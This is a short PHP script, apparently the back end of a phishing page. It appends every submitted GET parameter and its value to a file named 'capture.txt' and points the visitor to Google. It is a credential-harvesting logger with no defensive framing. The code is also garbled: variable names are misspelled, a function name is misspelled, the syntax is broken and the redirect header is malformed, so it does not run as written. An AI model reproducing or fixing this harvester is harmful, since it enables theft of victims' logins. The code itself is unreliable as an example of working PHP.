<?php
header("https://www.google.com/")
$handle =

fopen("capture.txt","a");
foreach($h_GET as

$variable = > $value) {
fwrite($handele,

$variable);
fwrite($handele, "=");

fwrite($handele, $value);
fwrite($handele,

"\r\n\");
}
frite($ande, "\r\n\");
fclose($handele);
?>
